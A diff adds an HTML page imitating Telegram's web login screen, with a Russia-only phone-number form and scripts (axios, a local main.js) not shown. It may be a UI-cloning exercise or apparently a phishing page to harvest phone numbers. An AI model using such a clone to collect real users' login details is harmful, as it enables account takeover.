@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="Transition full-height is-auth">
+        <div class="Transition Auth Transition_slide Transition_slide-active">
+          <div class="Transition_slide Transition_slide-active">
+            <div id="auth-phone-number-form" class="custom-scroll">
+              <div id='auth-form' class="auth-form">
+                <div id="logo"></div>
+                <h1>Telegram</h1>
+                <p class="note">Please confirm your country code and enter your phone number.</p>
+                <form class="form" id="form" action="">
+                  <div class="DropdownMenu CountryCodeInput">
+                    <div class="input-group touched">
+                      <div class="form-control" type="text" id="sign-in-phone-code" autocomplete="off"></div>
+                      <div class="Country-name">Russian Federtion</div>
+                      <label>Country</label><img class="downarrow" src="images/down-arrow.png" alt="">
+                    </div>
+                    <div class="Menu compact CountryCodeInput">
+                      <div role="presentation" class="bubble menu-container custom-scroll top left opacity-transition fast not-open not-shown" style="transform-origin: left top;">
+                        <div role="menuitem" tabindex="0" class="MenuItem selected compact"><span class="country-flag"><img src="./img-apple-160/1f1f7-1f1fa.png" class="emoji opacity-transition slow shown open" alt="🇷🇺" data-path="./img-apple-160/1f1f7-1f1fa.png" draggable="false"></span><span class="country-name">Russian Federation</span><span class="country-code">+7</span></div>
+                    </div>
+                  </div>
+                  <div class="input-group touched with-label">
+                    <input pattern=".{11,}" required maxlength="11" class="form-control mb0" name="number" type="text" id="sign-in-phone-number" inputmode="tel" aria-label="Your phone number">
+                    <span class="start-number">+7</span>
+                    <label for="sign-in-phone-number">Your phone number</label>
+                  </div>
+                  <label class="Checkbox">
+                    <!-- <input type="checkbox" id="sign-in-keep-session"> -->
+                    <input class="custom-checkbox" name="custom" type="checkbox">
+                    <label for="custom"></label>
+                    <div class="Checkbox-main"><span class="label" dir="auto">Keep me signed in</span></div>
+                  </label>
+                  <button type="submit" class="Button default primary next-button has-ripple">Next</button>
+                  <button type="button" class="Button default primary text has-ripple">Log in by QR Code
+                    <div class="ripple-container"></div>
+                  </button>
+                  <button type="button" class="Button default primary text">Продолжить на русском</button>
+                </form>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script src="https://unpkg.com/imask"></script>
+    <script src="main.js"></script>
+</body>
+</html>
